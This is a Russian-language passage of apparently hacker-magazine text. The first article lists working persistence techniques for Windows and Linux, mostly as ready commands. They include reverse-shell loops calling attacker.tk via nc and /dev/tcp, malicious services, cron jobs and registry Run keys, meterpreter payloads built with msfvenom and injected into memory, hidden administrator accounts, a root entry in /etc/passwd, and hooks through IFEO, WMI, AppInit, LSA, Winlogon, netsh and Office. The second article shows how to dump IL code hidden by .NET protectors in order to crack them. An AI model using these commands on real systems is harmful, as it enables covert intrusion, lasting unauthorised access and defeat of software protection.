по названию и описанию компании‐раз работчика, зашитым внутри фай ла.
Впрочем, ничто не мешает ата кующему подделать эти данные.
   Антивирусы же, как правило, не уда ляют записи в спис ках автозагрузки,
а удаляют сами исполняемые файлы. Поэтому битая ссылка в автозагрузке —
тревожный сигнал.
  Во многих случаях для пер систентности могут потребоваться права адми‐
нистратора. Это тоже может стать проб лемой, ведь далеко не каждый шелл
обладает нужными привилегиями. Поэтому  в каждом примере  я  буду
помечать символом $ ввод непривилегированного пользовате ля, а # — адми‐
нистратора. Для обнаружения будем использовать утилиту Autoruns, резуль‐
таты ты можешь наблюдать на скриншотах.


ШЕЛЛ
Организовать персистентность мож но прямо из командной строки. Чтобы
шелл открывался всегда, используем команду с бесконечным циклом, ухо‐
дящую в фон.


Windows
Вот как это работает в Windows:


cmd$> start cmd /C "for /L %n in (1,0,10) do ( nc.exe attacker.tk
8888 ‐e cmd.exe & ping ‐n 60 127.0.0.1 )"


Linux
bash$> ( bash ‐c "while :; do bash ‐i >& /dev/tcp/attacker.tk/8888 0>
&1; sleep 60; done"; ) &
bash$> nohup bash ‐c "while :; do bash ‐i >& /dev/tcp/attacker.tk/
8888 0>&1; sleep 60; done" &

 • Плюсы: управляемый интервал запуска, подойдет любой пользователь.
 • Минус: не переживет перезагрузку.





АВТОЗАГРУЗКА
Говоря о персистентнос ти, нельзя пройти мимо классичес кой и всем извес‐
тной автозагрузки. Ее преимущество в том, что она будет работать с правами
любого, даже неадминистративного пользователя.


Windows
cmd$> copy meter.exe %APPDATA%\Roaming\Microsoft\Windows\Start Menu\P
rograms\Startup\
cmd$> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /
v persistence /t REG_SZ /d "C:\users\username\meter.exe"
cmd#> copy meter.exe C:\ProgramData\Microsoft\Windows\Start Menu\P
rograms\Startup\
cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /
v persistence /t REG_SZ /d "C:\Windows\system32\meter.exe"


Linux
bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>
~/.bashrc

 • Плюсы: переживает перезагрузку, подойдет любой пользователь.
 • Минус: неуправляемый интервал запус ка.





СЕРВИСЫ
Использовать службу для закрепления более выгодно, чем автозагрузку, так
как Service Manager будет сам перезапус кать службу, если потребу ется.
  Для Windows создание службы потребует пра ва администратора.


cmd#> sc create persistence binPath= "nc.exe ‐e \windows\system32\c
md.exe attacker.tk 8888" start= auto
cmd#> sc failure persistence reset= 0 actions=
restart/60000/restart/60000/restart/60000
cmd#> sc start persistence

В Linux создать службу можно и с учетки прос того пользователя. Вот вари‐
анты для рута и для простого пользователя.


bash#> vim /etc/systemd/system/persistence.service
bash$> vim ~/.config/systemd/user/persistence.service

Содержимое файла:


[Unit]
Description=persistence


[Service]
ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'
Restart=always
RestartSec=60


[Install]
WantedBy=default.target

И запускаем созданную службу:


bash#> systemctl enable persistence.service
bash#> systemctl start persistence.service
bash$> systemctl ‐‐user enable persistence.service
bash$> systemctl ‐‐user start persistence.service

 • Плюсы: переживает перезагрузку, управляемый интервал запуска, под‐
   ходит любой пользователь.
 • Минус: необходимы права администра тора.





ЗАДАЧИ
Создание запланированной задачи — весь ма удобный способ поддержания
доступа. Заодно можно задать время и интервал запуска. Но делать это раз‐
решено, как правило, только привилегированным пользователям.


Windows
cmd#> at 13:37 \t emp\nc.exe ‐e \windows\system32\c md.exe attacker.tk
8888
cmd#> schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn persistence /
tr "c:\temp\nc.exe ‐e c:\windows\system32\cmd.exe attacker.tk 8888"


Linux
bash#> echo "* * * * * bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1" >>
/var/spool/cron/root
bash#> echo $'SHELL=/bin/bash\n* * * * * root bash ‐i >& /dev/tcp/
attacker.tk/8888 0>&1\n'> /etc/cron.d/pwn

 • Плюсы: переживает перезагрузку, управляемый интервал запуска.
 • Минус: нужны права администратора/root.





IN-MEMORY
Внедрение бэкдора, который будет висеть в оперативный памяти, имеет
смысл, если нужно закрепиться на целевой машине, не оставляя никаких сле‐
дов. Антивирусы обычно слабо контролируют деятельность в памяти, пос‐
кольку это сопряжено с большим дополнительным рас ходом ресурсов. Даже
опытный пользователь вряд ли заметит что‐то, что скры то внутри легального
процесса.
  В качестве in‐memory‐бэкдора мы будем использовать meterpreter. Это,
пожалуй, самый известный RAT, способ ный работать исключительно в памяти,
не трогая при этом диск.


Windows
msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT= 8888
‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount= 999999
cmd$> inject_windows.exe PID meter32.bin


Linux
msfvenom ‐p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=
8888 ‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount= 999999
bash$> inject_linux PID meter32.bin

Внедрить код мы можем не только в нативные процессы, но и в интерпре‐
тируемые, например интерпретатором Python:


msfvenom ‐p python/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT= 8888
‐o meter.py exitfunc=thread StagerRetryCount= 999999
$> pyrasite 12345 meter.py

За  максимальную  скрытность  платим  потерей  персистентности  после
перезагрузки.
 • Плюсы: подой дет любой пользователь, трудно обнаружить человеку.
 • Минусы: не переживает перезагрузку.





Поскольку вредоносный поток запус кается вне какой‐либо библиотеки, Proc‐
exp часто показывает такой поток как запущенный от нулевого адреса.


КОНФИГИ
Организация  персистентнос ти  через  изменение  конфигурации ОС —
отличный способ спрятать ся от антивируса. Это единственный слу чай, когда
мы не используем вооб ще никакой исполняемый код. Но применимо это,
только если у нас есть пря мой доступ к целевой машине.
  Создание скрытого пользователя, от имени которого можно будет потом
получить удаленный доступ, — это, пожалуй, самый извес тный вариант такой
атаки.


Windows
cmd#> net user attacker p@ssw0rd /add
cmd#> net localgroup administrators /add attacker
cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\W
inlogon\SpecialAccounts\UserList" /v attacker /t REG_DWORD /d 0 /f


Linux
bash#> openssl passwd ‐1 ‐salt test
bash#> echo 'post:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/:/bin/bash' >>
/etc/passwd

Простое и эффективное внедрение закладки в Windows через RDP:


cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\I
mage File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\w
indows\system32\cmd.exe"
cmd#> reg add "HKLM\system\currentcontrolset\control\Terminal Server\
WinStations\RDP‐Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f

 • Плюсы: трудно обна ружить антивирусом, переживает перезагрузку.
 • Минусы: требует пра ва администратора/root, не подходит, если машина
   за NAT или файрволом.





ОСОБЫЕ ПРИЕМЫ В LINUX
Вот мы и добрались до трюков, которые сра бота ют только в определенной
ОС. Начнем с Linux.


LD_PRELOAD
В Linux для того, чтобы в каждый запускаемый процесс подгружался нужный
нам код, можно использовать переменную LD_PRELOAD:


bash#> echo /path/to/meter.so >> /etc/ld.so.preload
bash#> echo export LD_PRELOAD=/path/to/meter.so >> /etc/profile
bash$> echo export LD_PRELOAD=/path/to/meter.so >> ~/.bashrc

 • Плюсы: переживает перезагрузку, подойдет любой пользователь.
 • Минус: неуправляемый интервал запус ка.


             INFO

                     Подробнее об этом методе читай в статье «Опе‐
                      рация «Пред загруз ка». Создаем userland‐руткиты
                        в Linux с помощью LD_PRELOAD».



rc.local
Один раз после перезагрузки мы можем выполнить команды в rc.local.


bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local

 • Плюс: переживает перезагрузку.
 • Минусы: неуправляемый интервал запус ка, нужны права root.


ОСОБЫЕ ПРИЕМЫ В WINDOWS
Здесь у нас будет больше интересных трю ков!


Дебаггер
Если атакующий знает, что атакуемый пользователь час то запускает какую‐то
программу, скажем калькулятор, то он может внедрить свой код в тело этой
программы с помощью джойнера. Одна ко вся кое вмешательство в исполня‐
емые файлы неумолимо повышает уровень недоверия к ним со стороны анти‐
вируса. Куда более изящным исполнением будет перехват запус ка:


cmd#> copy calc.exe _calc.exe
cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\I
mage File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /
C _calc.exe & c:\windows\nc.exe ‐e c:\windows\system32\cmd.exe
attacker.tk 8888" /f

Как только victim запустит, а затем закроет калькулятор, атакующий примет
reverse shell.
 • Плюс: переживает перезагрузку.
 • Минус: тре бует права администра тора.





Gflags
Почти таким же образом мож но орга низовать запуск своего кода, когда поль‐
зователь закрывает определенную прог рамму.


cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\I
mage File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD
/d 512
cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\S
ilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\S
ilentProcessExit\notepad.exe" /v MonitorProcess /d "nc ‐e \windows\s
ystem32\cmd.exe attacker.tk 8888"

 • Плюс: переживает перезагрузку.
 • Минус: тре бует права администра тора.

Autoruns этот способ не обна руживает, но ты можешь проверить ветку реес‐
тра:


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\S ilentProcessExit


WMI
Достаточно надежный спо соб автозапуска — через события WMI. Мы можем
запускать бэкдор через равные интервалы времени.


cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter
CREATE Name="persistence" , EventNameSpace="root\cimv2",QueryLanguage=
"WQL" , Query="SELECT * FROM __InstanceModificationEvent WITHIN 60
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
cmd#> wmic /NAMESPACE:"\\root\subscription" PATH
CommandLineEventConsumer CREATE Name="persistence" , ExecutablePath=
"C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.
exe"
cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __
FilterToConsumerBinding CREATE Filter="__EventFilter.Name="
persistence"", Consumer="CommandLineEventConsumer.Name="persistence""

 • Плюсы: переживает перезагрузку, управляемый интервал запуска.
 • Минус: тре бует права администра тора.





AppInit
В Windows есть интересный способ внедрения биб лиотек в оконные при‐
ложения с помощью AppInit (они должны использовать user32.dll).


cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\W
indows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\W
indows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f


cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\C
urrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\C
urrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\m
eter32.dll" /f

 • Плюс: переживает перезагрузку.
 • Минусы:  тре бует  права администра тора,  неуправляемый  интервал
   запуска.





Lsass
Еще одна возможность — прописать библиотеку в сис темном процессе lsass.
Это достаточно выгодное место, пос кольку в данном процессе хранятся те
самые учетные записи, которые мы извлекаем утилитой mimikatz.


cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v
"Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f

 • Плюс: переживает перезагрузку.
 • Минусы: требуются пра ва администра тора, неуправляемый интервал
   запуска, можно убить систему.





Winlogon
Чтобы каждый раз, как кто‐то из пользователей входит в систему, откры вал ся
шелл, можно использовать механизм Winlogon.


cmd#> reg add "HKLM\software\microsoft\windows nt\currentversion\w
inlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,
c:\windows\meter.exe"

 • Плюс: переживает перезагрузку.
 • Минус: неуправляемый интервал запус ка.





Netsh
Утилита настройки сети Netsh тоже позволяет подгружать произвольную биб‐
лиотеку. Это открывает воз можность организо вать через нее импровизи‐
рованную автозагрузку. Результат будет выглядеть безобидно, так как пер‐
воначально вызывается системный ком понент Windows.


cmd#> c:\windows\syswow64\n etsh.exe
netsh> add helper c:\windows\m eter32.dll
cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /
v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"

В итоге получаем такую цепочку: autorun → netsh.exe → meter.dll. При этом
meter.dll будет скрыт от глаз пользователя — тот уви дит лишь запуск легитим‐
ной Netsh, родного компонента Windows.
 • Плюсы: переживает перезагрузку, сложно обнаружить пользователю.
 • Минус: тре бует права администра тора.





Office
Этот способ подой дет, если ата куемый пользователь час то работает с офис‐
ным пакетом. Не такая уж редкость!


cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t
REG_SZ /d C:\u sers\username\m eter.dll

 • Плюсы: переживает перезагрузку, подойдет любой пользователь.
 • Минус: неуправляемый интервал запус ка.





ВЫВОДЫ
Мы рассмотрели основные и наибо лее популярные варианты, которые поз‐
воляют прописаться в сис теме — скрыт но или не очень. Они по большей час‐
ти не зависят от версии и конфигурации ОС и лег ко реализуемы. Универсаль‐
ного способа нет (иначе обна ружение было бы слишком простым!), и у каж‐
дого есть достоинства и недос татки. При выборе наша цель — сбалан‐
сировать надежность и скрытность.
  Этим списком выбор, конечно же, не ограничивается, и все в конечном
счете зависит только от твоей фантазии и изоб ретательности. В Windows
хороший помощник в поиске новых воз можнос тей для закрепле ния — все та
же утилита Autoruns.
  Однако выгодно расположенная в системе ссылка на бэкдор — это еще
не все. О том, какой исполня емый файл для это го использовать и как
при этом эффективно обойти антивирус, я рас ска жу в следующей своей
статье.
ВЗЛОМ

  РЕВЕРСИНГ
  .NET





                                    МВК





      КАК ИСКАТЬ JIT‐КОМПИЛЯТОР
          В ПРИЛОЖЕНИЯХ





Во время деком пиляции и ана лиза .NET‐приложений ревер‐
серы сталкиваются с различными методами антиотладки.
Один из них — сокрытие метадан ных и IL‐кода, которые вос‐
станавливаются  только при  JIT‐компиляции  программы.
Для борьбы с ними хакеры и реверс‐инженеры придумали
целый комплекс специальных инструментов и  методов,
которые мы рас смотрим в сегодняшней статье.


             INFO

                 О принципах взлома приложе ний, защищенных
                      протектором Enigma, читай в статьях  «Больше
                      не энигма. Ломаем защиту приложений Enigma
                       x64  актуальных  версий»  и  «Триальный  конь.
                       Как сломать trial, защищенный Enigma Protector».


C легкой руки Microsoft одной из самых популярных платформ для прог‐
раммирования в настоящее время ста ла .NET. Огромное количество инстру‐
ментов, библиотек и документации обес печива ют простоту вхождения даже
для самых начинающих кодеров, а кросс‐платформенность и все более
совершенная оптимизация кода делают ее одним из основных стандартов
написания коммерческого софта. Как следствие, инстру ментов для взлома
и реверс‐инжиниринга под эту платформу тоже успели создать немало. Сре‐
ди них dnSpy, ILspy, ILdasm, Dile, SAE и многие дру гие, имя им — легион!
  Задача для реверсеров упро щается тем, что по умол чанию скомпилиро‐
ванная программа фактически содержит свой исходник: име на символов хра‐
нятся в явном виде, а кросс‐платформенный IL‐псевдокод легко вос станав‐
ливается до исходных синтаксических конструкций C# или VB, из которых он
был получен при компиляции. Соответственно, взлом такой программы
для начинающего хакера — одно удо вольствие: достаточно загрузить ее
в dnSpy, и вот она, на блюдечке в сво их исходни ках, для удобства даже окра‐
шенных в приятные цвета. Отлаживай и правь как хочешь, как будто сам эту
программу и написал!


НЕМНОГО ТЕОРИИ
Разумеется, производители софта мириться с подобным положением дел
не могут, и на очередном витке конфронтации между хакерами и протек‐
торами было разработано много инс трументов, препятствующих вос станов‐
лению исходного кода из IL‐сборки. Грубо говоря, все подобные инс трумен‐
ты используют три основных прин ципа:
 • сокрытие (шифрование, компрес сия и так далее) .NET‐метаданных и IL‐
   кода с восстановлением только в крат кий миг JIT‐компиляции;
 • обфускация IL‐кода, то есть преднамеренное запутывание его логики,
   борьба с читаемостью текстовых строк и имен символов, чтобы понять
   логику работы восста новленного IL‐кода было сложнее;
 • комбинация двух предыду щих катего рий.

Сегодня мы поговорим о методах из первой категории. В принципе, наибо‐
лее простой и дубовый спо соб огра дить программу от ILDasm — ском‐
пилировать ее  с  атрибутом SupressIldasmAttribute. Понятное  дело,
это защита от честных людей, поскольку такая сборка превосходно детек‐
тируется как .NET‐приложение, деком пилируется другими инструментами,
а данный атрибут с полпинка снимается в CFF Explorer или, при изрядной сно‐
ровке, в простом HEX‐редакторе. Более интерес но «завернуть» метаданные
в обычное нативное приложение, формирующее и запускающее .NET‐сборку
на лету.
  В этом случае никакие детекторы не рас позна ют в ней .NET, если их пред‐
варительно не обучили этому трюку, а декомпиляторы и отладчики, с ходу
не  увидевшие  в  программе  метаданных,  обломаются  при  загрузке.
С помощью dnSpy можно попытаться исследовать такое приложе ние, однако
при прерывании он навряд ли сможет вос ста новить и трассировать код даль‐
ше, что делает такую отладку бесполезной. Как быть в таком слу чае?
  Самый простой способ — вос пользовать ся утилитой MegaDumper (или
даже ее более продвинутой версией ExtremeDumper). Если .NET сфор‐
мирован и запущен по всем пра вилам, то он корректно рас познается упо‐
мянутыми утилитами именно как .NET‐процесс, и при нажатии кнопочки
.NET dump дам пится  как стандартное .NET‐приложение. Правда, вовсе
не факт, что оно будет запус кать ся. Чтобы привес ти его в запускаемый вид,
придется проделать определенные телодвижения, в зависимости от прод‐
винутости протектора. Тем не менее метаданные .NET и IL в такой сдамплен‐
ной сборке будут доступны для деком пиляции и ана лиза. Можно убедиться
в этом, открыв сборку, например, в CFF Explorer. Одна ко я спе циально сделал
оговорку «если». Попробуем разобраться, почему подобное может не сра‐
ботать.
  Для этого постараюсь корот ко в двух словах напомнить принцип функци‐
онирования .NET‐приложения для тех, кто забыл матчасть. Несмотря на то что
сборка состоит из метаданных и кросс‐платформенного IL‐кода, при выпол‐
нении приложения он не интерпретиру ется, а компилируется в весьма опти‐
мизированный натив ный код целево го процессора и целевой операционной
системы. Делается это непос редственно при загрузке блока кода один раз,
впоследствии  будет выполняться уже скомпилиро ванный  нативный код
метода. Сам процесс называется JIT‐компиляция (Just In Time, «временная
компиляция на лету»). То есть если прервать прог рамму в произвольный
момент в отладчике типа x64dbg, то процесс будет остановлен именно
во время исполнения такого временно скомпилиро ванного нативного кода.
   Трассировать,  отлаживать  и  реверсировать  его,  конечно,  можно,
но целесообразность этого сомнительна. Нас интересу ет другой подход —
поймать и сдампить уже вос становленный фрагмент IL‐кода перед его JIT‐
компиляцией. Логика подска зывает, что, если мы хотим сделать это вручную,
нам надо найти в отладчике изначальную точку входа в JIT‐компилятор.
Самое простое — отыскать метод SystemDomain::Execute в биб лиотеке
clr.dll  (или mscorwks.dll для более  старых версий  .NET). Обычно
для подобных вещей рекомендуют использовать WinDbg и его расширение
SOS, но я для примера покажу, как это делать в x64dbg.


ИЩЕМ JIT-КОМПИЛЯТОР
Итак, загрузив нужное приложение в отладчик, мы с неприятным удивлением
обнаруживаем, что библиотека clr.dll отсутству ет в спис ке отладочных
символов. Значит, ее придется загрузить допол нительно, предварительно
отыскав глубоко в недрах подкатало гов системной папки Windows. Найдя
и загрузив clr.dll (попутно загрузится нес колько библиотек), мы снова
с раздражением обнаружим, что метод SystemDomain::Execute отсутству ет
в правом списке экспорта. Ну что ж, по счастью, x64dbg предос тавляет прек‐
расную возможность загрузить отладочные символы прямо с майкрософтов‐
ского сервера — для это го нужно щелкнуть правой клавишей мыши на clr.
dll и выбрать соответству ющий пункт в контекстном меню.
  Подождав некото рое время, мы увидим, что спи сок в правой части окна
отладчика изрядно увеличился и искомый метод SystemDomain::Execute
в нем уже присутствует. Ставим на него точку оста нова и запускаем прог‐
рамму. В момент останова на этом методе дотнетовские метаданные чаще
всего уже расшифрованы, распакова ны и их можно дампить в файл хоть
MegaDumper’ом, хоть Scylla из самого дебаггера. Однако этого тоже может
оказаться недостаточно. Попробуем копнуть чуть глубже и выйти на исходный
JIT‐компилятор.
  Для этого найдем и загрузим вышеописанным способом библиоте ку clr‐
jit.dll, а также отладочные символы к ней. Находим в них следующий
метод:


private: virtual enum CorJitResult __stdcall CILJit::compileMethod(
class ICorJitInfo *,struct CORINFO_METHOD_INFO *,unsigned int,
unsigned char * *,unsigned long *)

Это и есть искомая точка входа JIT‐компилятора, транслирующего IL‐код
в нативный машинозависимый. К сожалению (или к счастью), данный метод
может быть подменен через функцию GetJit того же самого модуля clrjit.
dll, чем и пользуются про текторы, инжектируя в компилятор собс твенный
модуль расшифровки IL‐кода. К нашей радос ти, совсем подменить ком‐
пилятор на свой собственный они не могут, ибо тогда им придется фактичес‐
ки с нуля переписывать всю платформу .NET, с полной поддержкой разных
операционных систем и процессоров. То есть в какой‐то момент расшифро‐
ванный код будет передан в найденный нами родной компилятор. Там мы его
благополучно примем. Ставим точку оста нова на данный метод и запускаем
программу.
  После того как программа оста новится, попробу ем проанализировать
параметры на стеке. Для этого снова вспомним теорию. В терминах язы ка
С описание данного метода выглядит вот так:


CorJitResult (__stdcall * compileMethod) {
    struct ICorJitCompiler      *pThis, /* IN */
    struct ICorJitInfo          *comp, /* IN */
    struct CORINFO_METHOD_INFO  *info, /* IN */
    unsigned /* CorJitFlag */   flags, /* IN */
    BYTE                        **nativeEntry, /* OUT */
    ULONG                       *nativeSizeOfCode /* OUT */

Третий сверху стека адрес (аккурат над двой ным словом flags, которые
обычно равны FFFFFFFF) — указатель на структуру CORINFO_METHOD_INFO.
Эта структура содержит данные о блоке IL‐кода, которым описывается ком‐
пилируемый метод. Снова покурив мануалы, находим описание этой струк‐
туры:


struct CORINFO_METHOD_INFO {
    CORINFO_METHOD_HANDLE ftn;
    CORINFO_MODULE_HANDLE scope;
    BYTE *                ILCode;
    unsigned              ILCodeSize;
    unsigned short        maxStack;
    unsigned short        EHcount;
    CorInfoOptions        options;
    CORINFO_SIG_INFO      args;
    CORINFO_SIG_INFO      locals;
};

Перейдя в дампе по ссылке, мы обнаружим, что третье двойное слово
с начала структуры и вправду ука затель на IL‐код метода, а четвертое — раз‐
мер блока. Конечно, довольно напряжно вот так вот руками в отладчике рас‐
шифровывать каждый метод по одно му. Однако мы теперь знаем, как это
делается, и при желании можем реверсировать всю пред шес твующую пос‐
ледовательность действий, которую произво дит с блоком кода инжекти‐
рованный в него протектор. В конце концов, можно инжектировать свой код
между протектором и родным компилятором и реализовы вать собственный
дампер для каждой новой защиты.


ПРОВЕРКА В БОЮ
Попробуем использовать данный метод на слу чайном приложении, которое
защищено распространенным и довольно мерзким протектором‐обфуска‐
тором Agile.Net. Приложение при загрузке в отладчики или декомпиляторы
выдает практически у всех методов пус тое тело, состоящее из одной коман‐
ды ret или ldnull/ret. То же самое творится в секции Main, однако .cctor
ссылается на вызов внешней DLL‐ки, внут ри которой при беглом осмотре
обнаруживается  упомина ние  AgileDotNetRT.dll.  Собственно,  die  так
и идентифицирует защиту, сомнений быть не может. Начинаем копать прог‐
рамму всеми доступными нам инс трументами.
  Деобфускаторы (включая родной Agile.NET‐Deobfuscator‐DNLIB) с ходу
справиться с программой не могут, дамп с помощью MegaDumper и Extream‐
Dumper не добавляет данных, отображающихся в телах методов. Не помогает
также ManagedJitter — словом, все инс тру менты, имеющиеся у нас под рукой,
оказались бессильны. Забегая вперед, отмечу, что существует версия дам‐
пера специально для Agile: SimpleMSILDecryptorForAgile, которая основана
именно на упомянутом выше принципе инъ екции своего кода в clrjit, но мы
попробуем дойти до этого своим путем.
   Итак, испытав все способы, загружаем нашу программу в x64dbg и,
как было описано выше, ставим бряк на CILJit::compileMethod. Несколько
раз бряк срабатывает нормально, правда подаваемый на вход компилиру‐
емый код методов не отличается от исходного, который мы видели в деком‐
пиляторе. И вдруг внезапно счастье заканчивается, программа молча завер‐
шается.  Похоже,  Agile  оправдывает свою  репутацию,  активно  борясь
с отладчиком.
  Мы тоже могли бы побороться с анти отладчиком, но сейчас у нас цель
несколько другая, и мы не отвлекаемся на подоб ные мелочи. Временно
отключаем точку останова и перезапус каем при ложение — оно стартует нор‐
мально. Ну что ж, антиотладчику не нравятся только активные точки останова
внутри clrjit, и это радует. Прерываем программу и опять акти виру ем точку
останова на compileMethod — по счастью, программа не кончает жизнь
самоубийством. Значит, проверка идет не постоянно, а в некоторых ключевых
точках, это тоже обнадеживает.
  Смотрим более внимательно, где именно мы остановились. Ага, вызов
clrjit::CompileMethod из той самой кас томной DLL‐ки. Смотрим по стеку
вызовов, откуда мы сюда попали. На наше счастье, всего в одном вложении
выше идет вызов инжектированной функции протектора из clr.dll. Мы наш‐
ли вход и выход расшифровщика IL‐кода. Cтавим на них две точки останова,
благо антиотладчик борется только с бря ками на оригинальный clrjit::
CompileMethod, после чего переза пускаем программу. Попутно ставим сох‐
ранение в лог значений CORINFO_METHOD_INFO*info и BYTE*ILCode на входе
и выходе из инъекции.
  Поскольку все точ ки останова рас положены вне clrjit, антиотладчик нам
уже не мешает. С момента запуска инжектированного компилятора два раза
он срабатывает вхолостую — исходный IL‐код передается на оригинальную
компиляцию без изменений. А вот на третий уже интерес но: указатель на IL‐
Code в структуре info подменен на новый блок памяти раз мером 0x100000,
который, в принципе, уже можно дампить для исследования. Оставим его
за рамками нашей статьи, остановимся только на паре моментов.
  Прежде все го проверим, какой именно метод подменен протектором.
На самом деле задача не такая прос тая, как может показаться. В структурах,
подаваемых на вход CompileMethod, имеются толь ко параметры компилиру‐
емого блока кода, но нет ни ука зателя на имя метода, ни даже его индекса
в таблице методов. А ведь это придется делать, если мы хотим написать свой
собственный дампер. Пря мой способ — использовать следующий метод
интерфейса ICorStaticInfo:


virtual const char* getMethodName(
    CORINFO_METHOD_HANDLE ftn, /* IN */
    const char            **moduleName /* OUT */
) = 0;

Здесь задействован параметр comp и хендл метода ftn, однако из отладчика
это сделать затруднительно, поэто му мы слегка схалтурим. Дело в том, что
хендл ftn (первое двойное сло во в структуре CORINFO_METHOD_INFO), если
его использовать как ука затель, указыва ет на одинарное слово — индекс
метода в .NET‐метадате EXE‐модуля. В нашем примере это 0x23=35.
  Открываем CFF Explorer и находим метод — Main. В оригинале он занима‐
ет 1 байт ret, однако на выходе он поправился до 0x1A байт. Попутно мы наш‐
ли и развилку в коде, фильтру ющую внеш ние методы, которые транзитом
передаются в оригинальный компилятор без изменений, а также сам код пре‐
образования и замены:


730B902E | mov ecx,dword ptr ds:[edx+C]
730B9031 | mov dword ptr ss:[ebp‐190],ecx
730B9037 | cmp dword ptr ss:[ebp‐19C],0
730B903E | je 730B90BF <‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
730B9040 | mov eax,dword ptr ss:[ebp‐18C]
730B9046 | push eax
730B9047 | mov ecx,dword ptr ss:[ebp‐48]
730B904A | push ecx
730B904B | lea edx,dword ptr ss:[ebp‐3C]
730B904E | push edx
730B904F | mov ecx,dword ptr ss:[ebp‐4]
730B9052 | call 730B1361
730B9057 | push 1C
730B9059 | push 0
730B905B | call dword ptr ds:[<&GetProcessHeap>]
730B9061 | push eax
730B9062 | call dword ptr ds:[<&RtlAllocateHeap>]
730B9068 | mov dword ptr ss:[ebp‐38],eax
730B906B | mov eax,dword ptr ss:[ebp‐3C]
730B906E | push eax
730B906F | mov ecx,dword ptr ss:[ebp‐38]
730B9072 | push ecx
730B9073 | call 730B1104
730B9078 | mov eax,dword ptr ss:[ebp+10]
730B907B | mov dword ptr ss:[ebp‐1A0],eax
730B9081 | mov eax,dword ptr ss:[ebp+10]
730B9084 | mov ecx,dword ptr ss:[ebp‐38]
735D9087 | mov edx,dword ptr ds:[ecx+C]
735D908A | mov dword ptr ds:[eax+8],edx <‐‐ edx‐указатель на новый IL
‐код метода Main


ЗАКЛЮЧЕНИЕ
И на закуску по традиции вспомним о нашей «Эниг ме», которой были пос‐
вящены две мои предыду щие статьи («Ломаем защиту приложений Enigma
x64 актуальных версий» и «Как сломать trial, защищенный Enigma Protector»).
Как я уже говорил, с ней совсем все плохо: дотнетовские метаданные упря‐
таны глубоко в упакованный и зашифрованный код. Соответственно, при‐
ложение  не  распознается  как  дот нетовское,  не  грузится  нормально
в отладчики и, понятное дело, не дам пится. При чем антиотладчик там нас‐
только серьезный, что не поз воляет прос то так взять и установить бряк
на CompileMethod (да и вооб ще никуда не поз воляет), а ведь нам для реали‐
зации описанного метода нуж на точка оста нова не просто в этом месте,
а именно в момент JIT‐компиляции основного кода при загрузке приложения.
  Все выглядит довольно‐таки страшно, однако попробуем зайти с другой
стороны. В статье «Ломаем защиту приложений Enigma» я упоминал, что
во  время  работы  приложения  рас шифрованные  секции  присутствуют
в памяти процесса. В дотнетовских программах для анализа обычно необ‐
ходимы две секции: .text, где содержатся метаданные и IL‐код, а также
.rsrc с ресурсами. Попробуем поискать эти секции в памяти процесса.
  За маску  поиска  секции  .text  возьмем,  к  примеру, имя  потока
"#Strings", содержащего в себе список строк со служебной информацией:
названия классов, методов и атрибутов.
   Таких вхождений обна руживается немало (по числу загруженных .NET‐
библиотек). Фильтруем их по заголовкам .NET‐метаданных и по Assembly.
Name определяем имя модуля. Для поиска секции ресурсов можно исполь‐
зовать какую‐нибудь строку из манифеста, например <assembly  xmlns=.
Принадлежность найденной секции идентифицируем по ProductName.
   Итак, у нас есть две рас шифрованные жизненно важные секции. Прилепив
к ним PE‐заголовок и подправив в нем валидные раз меры, мы получаем EXE‐
файл, который хоть и не запускается, но прекрасно загружается в деком‐
пиляторы и деобфускаторы для последующего анализа кода. По идее,
исполняемый файл можно даже сделать рабочим, запускаемым, восполь‐
зовавшись одним из инструментов, которые нетрудно отыскать в интернете.
Но это уже тема для другого раз говора.
